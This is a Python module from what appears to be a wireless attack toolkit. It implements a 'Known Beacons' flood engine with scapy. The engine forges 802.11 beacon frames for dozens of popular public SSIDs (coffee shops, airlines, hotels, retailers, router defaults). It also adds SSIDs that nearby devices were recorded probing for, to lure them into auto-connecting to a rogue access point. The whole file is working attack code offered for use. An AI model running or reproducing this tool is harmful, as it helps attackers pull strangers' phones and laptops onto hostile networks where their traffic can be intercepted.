"""
Known Beacons Flood Engine
──────────────────────────
Broadcasts beacon frames for popular open SSIDs to trigger auto-connect
on nearby devices. Sends in rotating batches to cover a large SSID pool.

Also injects beacons matching SSIDs that were probed by discovered clients
(pulled from the recon database) for targeted luring.
"""

import time
import threading

from scapy.all import sendp
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt, RadioTap

from .config import (
    BEACON_INTERVAL, KNOWN_BEACON_BATCH, KNOWN_BEACON_ROTATE,
    WIFI_BROADCAST, log,
)

# Common open SSIDs that trigger auto-connect on many devices
KNOWN_SSIDS = [
    "attwifi", "xfinitywifi", "Google Starbucks", "Starbucks WiFi",
    "McDonald's Free WiFi", "FREE_WIFI", "Airport Free WiFi",
    "Hotel WiFi", "Guest", "GUEST", "Public WiFi",
    "Hilton Honors", "Marriott_GUEST", "HolidayInn",
    "_Free WiFi", "T-Mobile", "MetroPCS", "CableWiFi",
    "optimumwifi", "XFINITY", "TWCWiFi", "Boingo Hotspot",
    "Southwest WiFi", "AmericanAirlines", "DeltaWiFi",
    "United_Wi-Fi", "gogoinflight", "AAInflight",
    "Walmart WiFi", "Target Free WiFi", "BestBuy",
    "HomeDepot", "Lowes", "KohlsFreeWifi",
    "Whole Foods WiFi", "Panera Bread", "ChickfilA Free WiFi",
    "Dunkin", "Tim Hortons WiFi", "Wendys Free WiFi",
    "SUBWAY", "BurgerKing WiFi", "PizzaHut Free WiFi",
    "default", "linksys", "NETGEAR", "ASUS", "dlink",
    "TP-LINK", "HOME-WIFI", "MySpectrumWiFi",
    "DIRECT-", "HP-Print", "Samsung_Setup",
]


class KnownBeaconsEngine:
    """
    Beacon flood engine. Uses both a hardcoded list of popular SSIDs
    and SSIDs probed by discovered clients (from recon database).
    """

    def __init__(self, interface, rogue_mac):
        self.interface = interface
        self.rogue_mac = rogue_mac
        self.running = False
        self._thread = None
        self._ssid_list = list(KNOWN_SSIDS)
        self._frames = []
        self._offset = 0
        self._last_rotate = time.time()

    def add_probed_ssids_from_db(self, db):
        """
        Pull SSIDs that were probed by clients during recon.
        These are high-value targets — devices actively looking for them.
        """
        db.cursor.execute(
            'SELECT DISTINCT probed_ssids FROM clients WHERE probed_ssids IS NOT NULL AND probed_ssids != ""')
        for row in db.cursor.fetchall():
            for ssid in row[0].split(','):
                ssid = ssid.strip()
                if ssid and ssid not in self._ssid_list:
                    self._ssid_list.append(ssid)
        log.info(f"Beacons: {len(self._ssid_list)} total SSIDs (including probed)")

    def _build_frames(self):
        frames = []
        for ssid in self._ssid_list:
            frame = (
                RadioTap() /
                Dot11(type=0, subtype=8, addr1=WIFI_BROADCAST,
                      addr2=self.rogue_mac, addr3=self.rogue_mac) /
                Dot11Beacon(cap=0x2105) /
                Dot11Elt(ID="SSID", info=ssid.encode()) /
                Dot11Elt(ID="Rates", info=b"\x0c\x12\x18\x24\x30\x48\x60\x6c") /
                Dot11Elt(ID="DSset", info=b"\x06")
            )
            frames.append(frame)
        return frames

    def _beacon_loop(self):
        while self.running:
            now = time.time()
            if now - self._last_rotate > KNOWN_BEACON_ROTATE:
                self._offset = (self._offset + KNOWN_BEACON_BATCH) % len(self._frames)
                self._last_rotate = now
            batch = self._frames[self._offset:self._offset + KNOWN_BEACON_BATCH]
            if len(batch) < KNOWN_BEACON_BATCH:
                batch += self._frames[:KNOWN_BEACON_BATCH - len(batch)]
            for frame in batch:
                if not self.running:
                    break
                sendp(frame, iface=self.interface, verbose=False)
                time.sleep(BEACON_INTERVAL)

    def start(self):
        if self.running:
            return
        self._frames = self._build_frames()
        self.running = True
        self._thread = threading.Thread(target=self._beacon_loop, daemon=True)
        self._thread.start()
        log.info(f"Beacons engine started ({len(self._ssid_list)} SSIDs)")

    def stop(self):
        self.running = False
        if self._thread:
            self._thread.join(timeout=5)
        log.info("Beacons engine stopped")
